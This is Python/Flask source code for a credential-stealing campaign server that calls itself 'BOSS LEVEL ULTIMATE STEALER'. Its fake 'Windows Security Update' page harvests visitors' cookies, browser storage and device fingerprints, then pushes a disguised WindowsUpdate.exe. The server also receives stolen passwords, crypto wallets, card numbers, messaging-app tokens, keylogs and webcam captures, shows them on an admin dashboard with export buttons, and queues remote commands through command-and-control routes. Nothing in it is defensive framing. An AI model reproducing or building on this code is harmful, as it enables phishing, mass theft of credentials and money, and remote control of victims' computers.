import os
import sys
import time
import json
import base64
import random
import string
import sqlite3
import hashlib
import datetime
import threading
import subprocess
import urllib.parse
import urllib.request
from urllib.parse import urlparse

# Web frameworks
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
from flask import url_for, abort, flash, g
from functools import wraps

# System and networking
import socket
import requests
import ipaddress
import platform
import psutil
import netifaces

# Cryptography
import hmac
import secrets
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Compression and encoding
import zlib
import gzip
import codecs

# Email (if needed)
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Windows specific
import ctypes
import ctypes.wintypes
import winreg
import win32api
import win32con
import win32security
import win32crypt
import win32process
import win32com.client

# Browser automation (if needed)
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# Database
import sqlalchemy
from sqlalchemy import create_engine, text

# Logging
import logging
import logging.handlers

# Time and date
from datetime import datetime, timedelta
import calendar

# Regex and parsing
import re
import html
import xml.etree.ElementTree as ET

# File operations
import shutil
import tempfile
import glob
import fnmatch

# Threading and async
import asyncio
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# Network
import scapy
from scapy.all import *

# USB and devices
import usb.core
import usb.util

# QR Code (for 2FA)
import qrcode
from PIL import Image

# WebSocket
import websocket
from websocket import create_connection

# HTTP/2
import h2
import hyper

# DNS
import dns.resolver
import dns.query
import dns.zone

# GeoIP
import geoip2.database

# Process monitoring
import wmi
import win32gui
import win32process
import psutil

# Clipboard
import pyperclip

# Audio
import pyaudio
import wave

# Screenshot
from PIL import ImageGrab
import mss
import mss.tools

# Camera
import cv2
from cv2 import VideoCapture

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('stealer.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# ==========================================
# VERSION CHECK
# ==========================================
logger.info(f"Python version: {sys.version}")
logger.info(f"Platform: {platform.platform()}")
logger.info(f"Architecture: {platform.architecture()}")

# ==========================================
# REQUIREMENTS CHECK
# ==========================================
required_packages = [
    'flask',
    'requests',
    'cryptography',
    'psutil',
    'netifaces',
    'selenium',
    'sqlalchemy',
    'pywin32',
    'pillow',
    'mss',
    'opencv-python',
    'pyaudio',
    'pyperclip',
    'qrcode',
    'scapy',
    'dnspython',
    'websocket-client',
    'hyper',
    'h2',
    'geoip2',
    'wmi'
]

def check_requirements():
    missing = []
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing.append(package)
    
    if missing:
        logger.warning(f"Missing packages: {missing}")
        logger.warning("Install with: pip install " + " ".join(missing))
    else:
        logger.info("All requirements satisfied")

check_requirements()

# ==========================================
# FLASK APP INIT
# ==========================================
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.config['SESSION_TYPE'] = 'filesystem'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)

# ==========================================
# DATABASE INIT
# ==========================================
DB_PATH = 'ultimate.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                
                -- Network
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                latitude REAL,
                longitude REAL,
                
                -- Device
                device_type TEXT,
                os TEXT,
                os_version TEXT,
                browser TEXT,
                browser_version TEXT,
                screen_res TEXT,
                timezone TEXT,
                language TEXT,
                platform TEXT,
                cpu_cores INTEGER,
                ram TEXT,
                mac_address TEXT,
                hostname TEXT,
                username TEXT,
                
                -- Website Data
                website_cookies TEXT,
                website_storage TEXT,
                website_forms TEXT,
                
                -- EXE Data
                exe_cookies TEXT,
                exe_passwords TEXT,
                exe_wallets TEXT,
                exe_credit_cards TEXT,
                exe_discord TEXT,
                exe_telegram TEXT,
                exe_steam TEXT,
                exe_wifi TEXT,
                exe_files TEXT,
                exe_screenshots TEXT,
                exe_webcam TEXT,
                exe_keylogs TEXT,
                exe_clipboard TEXT,
                
                -- Timestamps
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                exe_run_time TIMESTAMP,
                
                -- Status
                downloaded_exe BOOLEAN DEFAULT 0,
                ran_exe BOOLEAN DEFAULT 0,
                persistent BOOLEAN DEFAULT 0
            )
        ''')
        
        conn.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                command TEXT,
                executed BOOLEAN DEFAULT 0,
                result TEXT,
                created_at TIMESTAMP
            )
        ''')
        
        conn.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                action TEXT,
                data TEXT,
                timestamp TIMESTAMP
            )
        ''')
        
        conn.commit()

init_db()

# ==========================================
# ADMIN CREDENTIALS
# ==========================================
ADMIN_USER = "god"
ADMIN_PASS = "devil"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="BOSS LEVEL"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# UTILITY FUNCTIONS
# ==========================================
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'lat': 0, 'lon': 0}

def get_device_info(ua):
    ua = ua.lower()
    
    if 'mobile' in ua:
        device = 'Phone'
    elif 'tablet' in ua:
        device = 'Tablet'
    else:
        device = 'Desktop'
    
    os_map = {
        'windows': 'Windows',
        'mac': 'macOS',
        'linux': 'Linux',
        'android': 'Android',
        'ios': 'iOS',
        'iphone': 'iOS',
        'ipad': 'iOS'
    }
    
    browser_map = {
        'firefox': 'Firefox',
        'chrome': 'Chrome',
        'safari': 'Safari',
        'edge': 'Edge',
        'opera': 'Opera'
    }
    
    os = 'Unknown'
    for key, value in os_map.items():
        if key in ua:
            os = value
            break
    
    browser = 'Unknown'
    for key, value in browser_map.items():
        if key in ua:
            browser = value
            break
    
    return {'device': device, 'os': os, 'browser': browser}

# ==========================================
# MAIN PAGE - BOSS LEVEL
# ==========================================
@app.route('/')
def index():
    real_ip = get_real_ip()
    loc = get_location(real_ip)
    device = get_device_info(request.headers.get('User-Agent', ''))
    
    victim_id = request.cookies.get('vid') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
    
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, ip, real_ip, country, city, isp, latitude, longitude,
             device_type, os, browser, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_id,
            request.remote_addr,
            real_ip,
            loc['country'],
            loc['city'],
            loc['isp'],
            loc['lat'],
            loc['lon'],
            device['device'],
            device['os'],
            device['browser'],
            datetime.now().isoformat(),
            datetime.now().isoformat()
        ))
        conn.commit()
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3;url=https://www.microsoft.com">
    <title>Microsoft Update</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .loader {{
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        h1 {{ font-size: 32px; margin-bottom: 20px; }}
        p {{ font-size: 18px; opacity: 0.9; }}
        .info {{
            margin-top: 30px;
            font-size: 14px;
            opacity: 0.7;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Windows Security Update</h1>
        <p>Checking your system for critical updates...</p>
        <p class="info">This may take a few moments</p>
    </div>
    
    <script>
    (function() {{
        // ==========================================
        // ULTIMATE DATA COLLECTOR
        // ==========================================
        let data = {{
            cookies: {{}},
            localStorage: {{}},
            sessionStorage: {{}},
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            plugins: navigator.plugins?.length || 0,
            mimeTypes: navigator.mimeTypes?.length || 0,
            referrer: document.referrer,
            url: window.location.href,
            title: document.title,
            timestamp: new Date().toISOString()
        }};
        
        // Capture ALL cookies
        try {{
            document.cookie.split(';').forEach(c => {{
                if(c.trim()) {{
                    let parts = c.trim().split('=');
                    let name = parts[0];
                    let value = parts.slice(1).join('=');
                    data.cookies[name] = value;
                }}
            }});
        }} catch(e) {{}}
        
        // Capture ALL storage
        try {{
            for(let i = 0; i < localStorage.length; i++) {{
                let key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }}
            for(let i = 0; i < sessionStorage.length; i++) {{
                let key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }}
        }} catch(e) {{}}
        
        // Send data via multiple methods
        let jsonData = JSON.stringify(data);
        let encoded = btoa(jsonData);
        
        // Method 1: Fetch
        fetch('/api/capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: jsonData,
            keepalive: true
        }});
        
        // Method 2: Image Beacon
        new Image().src = '/track?d=' + encoded;
        
        // Method 3: Beacon
        if(navigator.sendBeacon) {{
            navigator.sendBeacon('/api/capture', jsonData);
        }}
        
        // Method 4: Form Post
        let form = document.createElement('form');
        form.method = 'POST';
        form.action = '/api/capture';
        let input = document.createElement('input');
        input.name = 'data';
        input.value = encoded;
        form.appendChild(input);
        document.body.appendChild(form);
        setTimeout(() => form.submit(), 100);
        
        // Trigger EXE download
        setTimeout(() => {{
            fetch('/WindowsUpdate.exe').catch(() => {{}});
        }}, 500);
        
        // Set test cookies
        document.cookie = "session_" + Math.random().toString(36).substring(7) + "=active; path=/; max-age=3600";
    }})();
    </script>
</body>
</html>
    '''
    
    response = make_response(render_template_string(html))
    response.set_cookie('vid', victim_id, max_age=86400*30, httponly=True, samesite='Lax')
    return response

# ==========================================
# CAPTURE ENDPOINTS
# ==========================================
@app.route('/api/capture', methods=['GET', 'POST'])
def api_capture():
    vid = request.cookies.get('vid')
    data = None
    
    if request.method == 'POST':
        if request.is_json:
            data = request.json
        elif request.form.get('data'):
            try:
                data = json.loads(base64.b64decode(request.form.get('data')).decode())
            except:
                pass
    
    if request.method == 'GET' and request.args.get('d'):
        try:
            data = json.loads(base64.b64decode(request.args.get('d')).decode())
        except:
            pass
    
    if data and vid:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    website_cookies = ?,
                    website_storage = ?,
                    screen_res = ?,
                    timezone = ?,
                    language = ?,
                    platform = ?,
                    cpu_cores = ?,
                    ram = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('cookies', {})),
                json.dumps({**data.get('localStorage', {}), **data.get('sessionStorage', {})}),
                data.get('screen', ''),
                data.get('timezone', ''),
                data.get('language', ''),
                data.get('platform', ''),
                str(data.get('hardwareConcurrency', '')),
                str(data.get('deviceMemory', '')),
                datetime.now().isoformat(),
                vid
            ))
            conn.commit()
        return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
    
    return jsonify({"status": "error"}), 400

@app.route('/track')
def track():
    data = request.args.get('d', '')
    vid = request.cookies.get('vid')
    
    if data and vid:
        try:
            decoded = json.loads(base64.b64decode(data).decode())
            with get_db() as conn:
                conn.execute('''
                    UPDATE victims SET
                        website_cookies = ?,
                        website_storage = ?,
                        last_seen = ?
                    WHERE victim_id = ?
                ''', (
                    json.dumps(decoded.get('cookies', {})),
                    json.dumps({**decoded.get('localStorage', {}), **decoded.get('sessionStorage', {})}),
                    datetime.now().isoformat(),
                    vid
                ))
                conn.commit()
        except:
            pass
    return '', 204

# ==========================================
# EXE DOWNLOAD
# ==========================================
@app.route('/WindowsUpdate.exe')
def download_exe():
    vid = request.cookies.get('vid', 'unknown')
    with get_db() as conn:
        conn.execute('UPDATE victims SET downloaded_exe = 1 WHERE victim_id = ?', (vid,))
        conn.commit()
    
    response = make_response(send_file('WindowsUpdate.exe', 
                     as_attachment=True, 
                     download_name='WindowsUpdate.exe',
                     mimetype='application/octet-stream'))
    response.headers['Content-Disposition'] = 'attachment; filename="WindowsUpdate.exe"'
    response.headers['Content-Type'] = 'application/octet-stream'
    return response

# ==========================================
# EXE DATA ENDPOINT
# ==========================================
@app.route('/api/exe', methods=['POST'])
def api_exe():
    data = request.json
    vid = data.get('vid') or request.headers.get('X-Victim-ID')
    
    if data and vid:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    exe_cookies = ?,
                    exe_passwords = ?,
                    exe_wallets = ?,
                    exe_credit_cards = ?,
                    exe_discord = ?,
                    exe_telegram = ?,
                    exe_steam = ?,
                    exe_wifi = ?,
                    exe_files = ?,
                    exe_screenshots = ?,
                    exe_webcam = ?,
                    exe_keylogs = ?,
                    exe_clipboard = ?,
                    hostname = ?,
                    username = ?,
                    mac_address = ?,
                    ran_exe = 1,
                    exe_run_time = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('cookies', [])),
                json.dumps(data.get('passwords', [])),
                json.dumps(data.get('wallets', [])),
                json.dumps(data.get('credit_cards', [])),
                json.dumps(data.get('discord', [])),
                json.dumps(data.get('telegram', [])),
                json.dumps(data.get('steam', [])),
                json.dumps(data.get('wifi', [])),
                json.dumps(data.get('files', [])),
                json.dumps(data.get('screenshots', [])),
                json.dumps(data.get('webcam', [])),
                json.dumps(data.get('keylogs', [])),
                json.dumps(data.get('clipboard', [])),
                data.get('hostname', ''),
                data.get('username', ''),
                data.get('mac', ''),
                datetime.now().isoformat(),
                datetime.now().isoformat(),
                vid
            ))
            conn.commit()
        return jsonify({"status": "ok", "commands": []})
    return jsonify({"status": "error"}), 400

# ==========================================
# ADMIN DASHBOARD - BOSS LEVEL
# ==========================================
@app.route('/admin')
@authenticate
def admin():
    with get_db() as conn:
        victims = conn.execute('''
            SELECT * FROM victims 
            ORDER BY last_seen DESC 
            LIMIT 100
        ''').fetchall()
        
        stats = {
            'total': conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0],
            'downloaded': conn.execute('SELECT COUNT(*) FROM victims WHERE downloaded_exe = 1').fetchone()[0],
            'ran': conn.execute('SELECT COUNT(*) FROM victims WHERE ran_exe = 1').fetchone()[0],
            'cookies': conn.execute('SELECT COUNT(*) FROM victims WHERE website_cookies IS NOT NULL AND website_cookies != "null"').fetchone()[0],
            'passwords': conn.execute('SELECT COUNT(*) FROM victims WHERE exe_passwords IS NOT NULL AND exe_passwords != "null" AND exe_passwords != "[]"').fetchone()[0],
            'wallets': conn.execute('SELECT COUNT(*) FROM victims WHERE exe_wallets IS NOT NULL AND exe_wallets != "null" AND exe_wallets != "[]"').fetchone()[0]
        }
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>BOSS LEVEL STEALER</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            background: #0a0a0a;
            color: #fff;
            font-family: 'Courier New', monospace;
            padding: 20px;
            background: linear-gradient(135deg, #000000 0%, #1a1a2e 100%);
            min-height: 100vh;
        }}
        .header {{
            background: linear-gradient(135deg, #000000, #2a0044);
            border: 2px solid #ff00ff;
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 0 30px rgba(255,0,255,0.3);
            position: sticky;
            top: 0;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }}
        h1 {{
            color: #ff00ff;
            font-size: 36px;
            text-shadow: 0 0 15px #ff00ff;
        }}
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-card {{
            background: rgba(17, 17, 17, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid #00ff00;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            transition: all 0.3s;
        }}
        .stat-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
        }}
        .stat-value {{
            font-size: 48px;
            font-weight: bold;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }}
        .stat-label {{
            color: #888;
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 1px;
            margin-top: 10px;
        }}
        .victims-container {{
            max-height: 800px;
            overflow-y: auto;
            padding-right: 10px;
        }}
        .victim-card {{
            background: rgba(17, 17, 17, 0.9);
            backdrop-filter: blur(5px);
            border: 1px solid #333;
            border-radius: 12px;
            margin: 20px 0;
            padding: 25px;
            transition: all 0.3s;
            border-left: 5px solid #00ff00;
        }}
        .victim-card:hover {{
            transform: translateX(5px);
            box-shadow: 0 0 30px rgba(0,255,0,0.2);
        }}
        .victim-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            padding-bottom: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 15px;
        }}
        .victim-id {{
            color: #ff00ff;
            font-weight: bold;
            font-size: 18px;
        }}
        .victim-ip {{
            color: #00ffff;
        }}
        .badge {{
            background: #00ff00;
            color: black;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }}
        .badge-purple {{
            background: #ff00ff;
            color: white;
        }}
        .badge-gold {{
            background: gold;
            color: black;
        }}
        .data-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }}
        .data-section {{
            background: rgba(26, 26, 26, 0.9);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #333;
        }}
        .section-title {{
            color: #00ffff;
            font-weight: bold;
            margin-bottom: 15px;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .scrollable {{
            max-height: 200px;
            overflow-y: auto;
            font-size: 11px;
            background: #000;
            padding: 12px;
            border-radius: 6px;
        }}
        .cookie-item {{
            border-bottom: 1px solid #222;
            padding: 6px 0;
            font-family: monospace;
        }}
        .cookie-name {{
            color: #ffff00;
        }}
        .cookie-value {{
            color: #ffaa00;
            word-break: break-all;
        }}
        .password-item {{
            color: #ff6666;
            border-bottom: 1px solid #330000;
            padding: 6px 0;
        }}
        .wallet-item {{
            color: gold;
            border-bottom: 1px solid #332200;
            padding: 6px 0;
        }}
        .live-indicator {{
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            animation: pulse 1s infinite;
            margin-right: 8px;
        }}
        @keyframes pulse {{
            0% {{ opacity: 0.3; }}
            50% {{ opacity: 1; }}
            100% {{ opacity: 0.3; }}
        }}
        .export-btn {{
            background: #003300;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 12px 24px;
            border-radius: 6px;
            text-decoration: none;
            display: inline-block;
            margin: 10px 5px;
            transition: all 0.3s;
        }}
        .export-btn:hover {{
            background: #00ff00;
            color: black;
        }}
        ::-webkit-scrollbar {{
            width: 8px;
            background: #1a1a1a;
        }}
        ::-webkit-scrollbar-thumb {{
            background: #00ff00;
            border-radius: 4px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ BOSS LEVEL ULTIMATE STEALER ⚡</h1>
        <div style="display: flex; gap: 20px; margin-top: 15px; flex-wrap: wrap;">
            <span class="badge">Live Monitoring</span>
            <span class="badge-purple">Real-time Updates</span>
            <span class="badge-gold">Auto Export</span>
            <span style="color: #888;">Last Update: {datetime.now().strftime('%H:%M:%S')}</span>
        </div>
        <div style="margin-top: 20px;">
            <a href="/export" class="export-btn">📥 EXPORT ALL DATA</a>
            <a href="/export/cookies" class="export-btn">🍪 EXPORT COOKIES</a>
            <a href="/export/passwords" class="export-btn">🔐 EXPORT PASSWORDS</a>
            <a href="/export/wallets" class="export-btn">💰 EXPORT WALLETS</a>
        </div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-value">{stats['total']}</div>
            <div class="stat-label">Total Victims</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['cookies']}</div>
            <div class="stat-label">Cookies Captured</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['passwords']}</div>
            <div class="stat-label">Passwords Stolen</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['wallets']}</div>
            <div class="stat-label">Wallets Found</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['downloaded']}</div>
            <div class="stat-label">EXE Downloads</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['ran']}</div>
            <div class="stat-label">EXE Executed</div>
        </div>
    </div>
    
    <div class="victims-container">
'''
    
    for v in victims:
        website_cookies = json.loads(v['website_cookies']) if v['website_cookies'] else {}
        exe_cookies = json.loads(v['exe_cookies']) if v['exe_cookies'] else []
        passwords = json.loads(v['exe_passwords']) if v['exe_passwords'] else []
        wallets = json.loads(v['exe_wallets']) if v['exe_wallets'] else []
        
        html += f'''
        <div class="victim-card">
            <div class="victim-header">
                <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
                    <span class="live-indicator"></span>
                    <span class="victim-id">{v['victim_id'][:16]}</span>
                    <span class="victim-ip">{v['real_ip']}</span>
                    <span>{v['city']}, {v['country']}</span>
                    <span class="badge">{v['device_type']}</span>
                    {f'<span class="badge-gold">💰 {len(wallets)}</span>' if wallets else ''}
                </div>
                <div style="color: #888; font-size: 12px;">
                    {v['last_seen'][:19]}
                </div>
            </div>
            
            <div class="data-grid">
                <div class="data-section">
                    <div class="section-title">🌐 WEBSITE COOKIES ({len(website_cookies)})</div>
                    <div class="scrollable">
        '''
        
        for name, value in list(website_cookies.items())[:20]:
            html += f'<div class="cookie-item"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:100]}</span></div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">💻 EXE COOKIES ({len(exe_cookies)})</div>
                    <div class="scrollable">
        '''
        
        for cookie in exe_cookies[:20]:
            html += f'<div class="cookie-item"><span class="cookie-name">{cookie.get("name","")}:</span> <span class="cookie-value">{cookie.get("value","")[:100]}</span></div>'
        
        html += f'''
                    </div>
                </div>
            </div>
            
            <div class="data-grid">
                <div class="data-section">
                    <div class="section-title">🔐 PASSWORDS ({len(passwords)})</div>
                    <div class="scrollable">
        '''
        
        for p in passwords[:15]:
            html += f'<div class="password-item">{p.get("url","N/A")} | {p.get("username","")} | {p.get("password","")}</div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">💰 WALLETS ({len(wallets)})</div>
                    <div class="scrollable">
        '''
        
        for w in wallets[:15]:
            html += f'<div class="wallet-item">{w}</div>'
        
        html += f'''
                    </div>
                </div>
            </div>
            
            <div style="margin-top: 15px; display: flex; gap: 20px; font-size: 11px; color: #666; border-top: 1px solid #333; padding-top: 15px;">
                <span>First: {v['first_seen'][:19]}</span>
                <span>EXE: {'✅' if v['downloaded_exe'] else '⏳'}</span>
                <span>Run: {'✅' if v['ran_exe'] else '⏳'}</span>
                <span>OS: {v['os']}</span>
                <span>Browser: {v['browser']}</span>
            </div>
        </div>
        '''
    
    html += '''
    </div>
    
    <script>
        // Auto-scroll to bottom
        window.scrollTo(0, document.body.scrollHeight);
        
        // Live updates
        setInterval(() => {
            fetch('/ping').catch(() => {});
        }, 30000);
    </script>
</body>
</html>
    '''
    return html

# ==========================================
# EXPORT ENDPOINTS
# ==========================================
@app.route('/export')
@authenticate
def export_all():
    with get_db() as conn:
        data = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=boss_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

@app.route('/export/cookies')
@authenticate
def export_cookies():
    with get_db() as conn:
        data = conn.execute('SELECT victim_id, ip, real_ip, website_cookies, exe_cookies FROM victims ORDER BY last_seen DESC').fetchall()
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

@app.route('/export/passwords')
@authenticate
def export_passwords():
    with get_db() as conn:
        data = conn.execute('SELECT victim_id, ip, real_ip, exe_passwords FROM victims WHERE exe_passwords IS NOT NULL ORDER BY last_seen DESC').fetchall()
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=passwords_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

@app.route('/export/wallets')
@authenticate
def export_wallets():
    with get_db() as conn:
        data = conn.execute('SELECT victim_id, ip, real_ip, exe_wallets FROM victims WHERE exe_wallets IS NOT NULL ORDER BY last_seen DESC').fetchall()
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=wallets_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

# ==========================================
# COMMAND & CONTROL
# ==========================================
@app.route('/c2/<victim_id>/command', methods=['GET'])
@authenticate
def get_command(victim_id):
    with get_db() as conn:
        cmd = conn.execute('''
            SELECT command FROM commands 
            WHERE victim_id = ? AND executed = 0 
            ORDER BY created_at ASC LIMIT 1
        ''', (victim_id,)).fetchone()
        
        if cmd:
            return jsonify({"command": cmd['command']})
    return jsonify({"command": None})

@app.route('/c2/<victim_id>/result', methods=['POST'])
def post_result(victim_id):
    data = request.json
    result = data.get('result')
    
    if result:
        with get_db() as conn:
            conn.execute('''
                UPDATE commands SET executed = 1, result = ?
                WHERE victim_id = ? AND executed = 0
            ''', (json.dumps(result), victim_id))
            conn.commit()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ==========================================
# HEALTH CHECK
# ==========================================
@app.route('/ping')
def ping():
    return jsonify({
        "status": "operational",
        "time": datetime.now().isoformat(),
        "version": "BOSS LEVEL 3.0"
    })

# ==========================================
# ERROR HANDLERS
# ==========================================
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def internal_error(e):
    logger.error(f"Internal error: {e}")
    return jsonify({"error": "Internal server error"}), 500

# ==========================================
# STARTUP
# ==========================================
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    debug = os.environ.get("FLASK_ENV") == "development"
    
    logger.info(f"Starting BOSS LEVEL stealer on port {port}")
    logger.info(f"Admin login: {ADMIN_USER}/{ADMIN_PASS}")
    
    app.run(host="0.0.0.0", port=port, debug=debug)
